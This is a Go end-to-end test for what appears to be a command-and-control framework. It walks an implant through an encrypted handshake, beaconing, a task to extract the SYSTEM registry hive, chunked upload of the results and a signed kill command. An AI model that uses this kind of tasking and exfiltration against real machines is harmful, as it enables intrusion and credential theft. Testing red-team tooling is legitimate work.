package main

import (
	"bytes"
	"crypto/ecdh"
	"crypto/ed25519"
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"testing"
	"time"

	"github.com/ashwnn/adverse-go/internal/cryptokeys"
	"github.com/ashwnn/adverse-go/internal/message"
	"github.com/ashwnn/adverse-go/internal/server"
	"github.com/ashwnn/adverse-go/internal/transport"
	"github.com/ashwnn/adverse-go/internal/wire"
)

const testSecret = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"

// TestEndToEnd performs a full loopback test:
// hello → beacon → task extract → 2 results with chunk reassembly → kill signed → verified.
func TestEndToEnd(t *testing.T) {
	// Setup server
	srv, err := server.New(testSecret, slog.Default())
	if err != nil {
		t.Fatal(err)
	}
	srv.BeaconIntervalS = 30
	srv.BeaconJitterS = 10

	h := transport.NewHandler(srv, slog.Default())

	// Setup httptest server
	ts := httptest.NewTLSServer(h)
	defer ts.Close()

	// Agent setup
	agentID := "aabbccdd"
	secretBytes, _ := cryptokeys.Secret32(testSecret)
	serverXPriv, _ := cryptokeys.DeriveServerKey(secretBytes)
	serverSignPriv, _ := cryptokeys.DeriveSignKey(secretBytes)
	serverSignPub := serverSignPriv.Public().(ed25519.PublicKey)

	// Generate agent ephemeral
	ephPriv, _ := ecdh.X25519().GenerateKey(rand.Reader)
	ephPubBytes := ephPriv.PublicKey().Bytes()
	var ephPub [32]byte
	copy(ephPub[:], ephPubBytes)
	salt := [16]byte{0xde, 0xad, 0xbe, 0xef, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c}
	sid := hex.EncodeToString([]byte("e2e-test-sid-0001"))

	// Derive handshake key (static ECDH) for parsing hello ack
	serverPub, _ := cryptokeys.ServerPublicBytes(serverXPriv)
	hsKey, _ := cryptokeys.HandshakeKey(ephPriv, serverPub, salt, agentID)
	hsPrefix, _ := cryptokeys.FramePrefix(hsKey, "v2")

	bootstrapKey := srv.ComputeBootstrapKey()

	// Create TLS client that trusts the test server's cert
	client := ts.Client()
	client.Transport = &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	// ---- Step 1: Hello ----
	helloPayload := map[string]any{
		"agent_id": agentID,
		"sid":      sid,
		"eph_pub":  hex.EncodeToString(ephPub[:]),
		"salt":     hex.EncodeToString(salt[:]),
	}
	helloPayloadBytes, _ := json.Marshal(helloPayload)
	helloMsg := message.Make("hello", agentID, "hello-0", string(helloPayloadBytes), float64(time.Now().Unix()))
	helloMsgBytes, _ := json.Marshal(helloMsg)

	helloFrame, err := wire.Build(helloMsgBytes, bootstrapKey[:], []byte(wire.LegacyMagic), nil, 0, wire.DirectionClientToServer)
	if err != nil {
		t.Fatal(err)
	}

	resp := doPost(t, client, ts.URL, helloFrame)
	if resp.status != http.StatusOK {
		t.Fatalf("hello: expected 200, got %d: %s", resp.status, string(resp.body))
	}

	// Parse hello ack with handshake key (NOT the FS session key)
	beaconPlain := parseSessionFrame(t, resp.body, hsKey[:], hsPrefix[:], []byte(agentID+":in"))
	var beaconMsg map[string]any
	json.Unmarshal(beaconPlain, &beaconMsg)
	if beaconMsg["type"] != "beacon" {
		t.Fatalf("expected beacon, got %v", beaconMsg["type"])
	}
	if beaconMsg["task_id"] != "hello-ack" {
		t.Fatalf("expected hello-ack, got %v", beaconMsg["task_id"])
	}

	// Extract server_eph_pub and derive forward-secret session key
	payloadStr, _ := beaconMsg["payload"].(string)
	var ackPayload struct {
		ServerEphPub string `json:"server_eph_pub"`
	}
	json.Unmarshal([]byte(payloadStr), &ackPayload)
	if ackPayload.ServerEphPub == "" {
		t.Fatal("hello ack missing server_eph_pub")
	}
	serverEphPubBytes, _ := hex.DecodeString(ackPayload.ServerEphPub)
	var serverEphPub [32]byte
	copy(serverEphPub[:], serverEphPubBytes)

	sessionKey, _ := cryptokeys.SessionKey(ephPriv, serverEphPub, salt, agentID)
	prefix, _ := cryptokeys.FramePrefix(sessionKey, "v2")

	t.Logf("hello → beacon OK (hello-ack)")

	// ---- Step 2: Queue a task ----
	jobID := hex.EncodeToString([]byte("0123456789abcdef"))
	srv.EnqueueTask(agentID, "task-extract-1", "extract", map[string]any{
		"action":     "extract",
		"job_id":     jobID,
		"hives":      []string{"SYSTEM"},
		"chunk_size": 131072,
	})

	// ---- Step 3: Send beacon to receive task ----
	var txSeq uint32 = 0
	beaconMsg2 := message.Make("beacon", agentID, "beacon-2",
		`{"interval":30}`, float64(time.Now().Unix()))
	beaconMsg2Bytes, _ := json.Marshal(beaconMsg2)
	beaconFrame2, _ := wire.Build(beaconMsg2Bytes, sessionKey[:], prefix[:], []byte(agentID+":out"), txSeq, wire.DirectionClientToServer)
	txSeq++

	resp2 := doPost(t, client, ts.URL, beaconFrame2)
	if resp2.status != http.StatusOK {
		t.Fatalf("beacon: expected 200, got %d", resp2.status)
	}

	taskPlain := parseSessionFrame(t, resp2.body, sessionKey[:], prefix[:], []byte(agentID+":in"))
	var taskMsg map[string]any
	json.Unmarshal(taskPlain, &taskMsg)
	if taskMsg["type"] != "task" {
		t.Fatalf("expected task, got %v", taskMsg["type"])
	}
	t.Logf("beacon → task extract OK (job_id=%s)", jobID)

	// ---- Step 4: Send 2 results with chunk reassembly ----
	for seq := uint32(0); seq < 2; seq++ {
		hive := "SYSTEM"
		path := `\\REGISTRY\\SOFTWARE`
		data := []byte(fmt.Sprintf("chunk-data-%d", seq))

		chunkWire := make([]byte, 12+len(hive)+len(path)+len(data))
		// seq
		chunkWire[0] = byte(seq >> 24)
		chunkWire[1] = byte(seq >> 16)
		chunkWire[2] = byte(seq >> 8)
		chunkWire[3] = byte(seq)
		// hiveLen
		chunkWire[4] = byte(len(hive) >> 8)
		chunkWire[5] = byte(len(hive))
		// pathLen
		chunkWire[6] = byte(len(path) >> 8)
		chunkWire[7] = byte(len(path))
		// dataLen
		chunkWire[8] = byte(len(data) >> 24)
		chunkWire[9] = byte(len(data) >> 16)
		chunkWire[10] = byte(len(data) >> 8)
		chunkWire[11] = byte(len(data))
		copy(chunkWire[12:], []byte(hive))
		copy(chunkWire[12+len(hive):], []byte(path))
		copy(chunkWire[12+len(hive)+len(path):], data)

		resultPayload, _ := json.Marshal(map[string]any{
			"job_id":   jobID,
			"hive":     hive,
			"seq":      float64(seq),
			"total":    float64(2),
			"sha256":   "abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890",
			"data_b64": encodeBase64(chunkWire),
		})
		resultMsg := message.Make("result", agentID, jobID, string(resultPayload), float64(time.Now().Unix()))
		resultMsgBytes, _ := json.Marshal(resultMsg)
		resultFrame, _ := wire.Build(resultMsgBytes, sessionKey[:], prefix[:], []byte(agentID+":out"), txSeq, wire.DirectionClientToServer)
		txSeq++

		resp := doPost(t, client, ts.URL, resultFrame)
		if resp.status != http.StatusOK {
			t.Fatalf("result %d: expected 200, got %d", seq, resp.status)
		}

		// Parse ack beacon
		ackPlain := parseSessionFrame(t, resp.body, sessionKey[:], prefix[:], []byte(agentID+":in"))
		var ackMsg map[string]any
		json.Unmarshal(ackPlain, &ackMsg)
		if ackMsg["type"] != "beacon" {
			t.Fatalf("expected beacon ack, got %v", ackMsg["type"])
		}
		t.Logf("result %d → beacon ack OK", seq)
	}

	// Verify results stored
	results := srv.ResultsFor(agentID)
	if len(results) != 2 {
		t.Fatalf("expected 2 results, got %d", len(results))
	}

	// Verify chunk reassembly
	_, chunkReceived, chunkExists := srv.ChunkStatus(jobID)
	if !chunkExists {
		t.Fatal("chunk not found")
	}
	if chunkReceived != 2 {
		t.Fatalf("expected 2 chunks, got %d", chunkReceived)
	}

	// ---- Step 5: Kill ----
	_, killEpoch, err := srv.EnqueueKill(agentID, "kill")
	if err != nil {
		t.Fatal(err)
	}

	// Send another beacon to receive the kill
	beaconMsg3 := message.Make("beacon", agentID, "beacon-3", "{}", float64(time.Now().Unix()))
	beaconMsg3Bytes, _ := json.Marshal(beaconMsg3)
	beaconFrame3, _ := wire.Build(beaconMsg3Bytes, sessionKey[:], prefix[:], []byte(agentID+":out"), txSeq, wire.DirectionClientToServer)
	txSeq++

	resp3 := doPost(t, client, ts.URL, beaconFrame3)
	if resp3.status != http.StatusOK {
		t.Fatalf("beacon for kill: expected 200, got %d", resp3.status)
	}

	killPlain := parseSessionFrame(t, resp3.body, sessionKey[:], prefix[:], []byte(agentID+":in"))
	var killMsg map[string]any
	json.Unmarshal(killPlain, &killMsg)

	if killMsg["type"] != "kill" {
		t.Fatalf("expected kill, got %v", killMsg["type"])
	}

	// Verify kill signature
	sigHex, _ := killMsg["sig"].(string)
	sig, _ := hex.DecodeString(sigHex)
	epochFloat, _ := killMsg["epoch"].(float64)
	epoch := uint64(epochFloat)

	if epoch != killEpoch {
		t.Fatalf("kill epoch mismatch: %d != %d", epoch, killEpoch)
	}

	if !cryptokeys.KillVerify(serverSignPub, epoch, agentID, "kill", sig) {
		t.Fatal("kill signature verification failed")
	}

	t.Logf("kill epoch=%d sig=%s verified OK", epoch, sigHex[:16])
	t.Logf("=== ALL E2E TESTS PASSED ===")
}

// --- helpers ---

type httpResp struct {
	status int
	body   []byte
}

func doPost(t *testing.T, client *http.Client, url string, frame []byte) httpResp {
	t.Helper()
	resp, err := client.Post(url, "application/octet-stream", bytes.NewReader(frame))
	if err != nil {
		t.Fatalf("doPost: %v", err)
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	return httpResp{status: resp.StatusCode, body: body}
}

func parseSessionFrame(t *testing.T, data, sessionKey, prefix, aad []byte) []byte {
	t.Helper()
	plain, _, complete, err := wire.Parse(data, sessionKey, prefix, aad, wire.DirectionServerToClient)
	if err != nil {
		t.Fatalf("parseSessionFrame: %v", err)
	}
	if !complete {
		t.Fatal("parseSessionFrame: incomplete")
	}
	return plain
}

func encodeBase64(data []byte) string {
	return base64.StdEncoding.EncodeToString(data)
}

// cmdKill rejects invalid --payload values locally (before any network
// call). The server enforces the same policy in the admin handler.
func TestCmdKillPayloadValidation(t *testing.T) {
	tests := []struct {
		payload string
		wantOK  bool
	}{
		{"kill", true},
		{"kill_switch", true},
		{"reboot", false},
		{"", false},
		{"KILL", false},
		{"kill_switch_extra", false},
	}
	for _, tt := range tests {
		err := validateKillPayload(tt.payload)
		if (err == nil) != tt.wantOK {
			t.Errorf("payload=%q: want ok=%v, got err=%v", tt.payload, tt.wantOK, err)
		}
	}
}
